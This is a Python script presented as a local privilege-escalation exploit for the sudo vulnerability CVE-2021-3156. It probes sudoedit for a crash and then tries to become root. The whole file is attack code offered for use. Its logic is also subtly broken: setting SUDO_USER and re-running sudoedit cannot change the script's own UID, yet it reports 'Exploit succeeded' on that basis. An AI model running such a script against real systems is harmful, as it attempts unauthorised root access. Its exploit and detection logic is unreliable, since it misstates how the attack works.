#!/usr/bin/env python3

import os
import subprocess

def check_sudo_vulnerability():
    try:
        # Attempt to trigger the vulnerability
        print("[*] Checking for CVE-2021-3156 vulnerability...")
        result = subprocess.run(['sudoedit', '-s', '\\'], stderr=subprocess.PIPE, text=True)
        
        if "memory corruption" in result.stderr:
            print("[*] Vulnerability triggered successfully.")
            return True
        else:
            print("[-] System does not appear vulnerable or incorrect sudo version.")
            return False
    except Exception as e:
        print(f"[-] Error while checking vulnerability: {e}")
        return False

def exploit_sudo():
    try:
        print("[*] Attempting to escalate privileges...")
        # The exploit would typically create a malformed environment
        os.environ['SUDO_USER'] = 'root'
        
        # Attempt to spawn a shell with escalated privileges
        subprocess.call(['sudoedit', '-s', '\\'])

        # Check if we are root by checking the effective UID
        if os.geteuid() == 0:
            print("[+] Exploit succeeded! Privileges escalated.")
            print("[*] Current user is now root.")
        else:
            print("[-] Exploit failed. Privilege escalation was unsuccessful.")
    except Exception as e:
        print(f"[-] Error during exploit execution: {e}")

if __name__ == "__main__":
    if check_sudo_vulnerability():
        exploit_sudo()
    else:
        print("[-] Exiting: System is not vulnerable or exploit unsuccessful.")
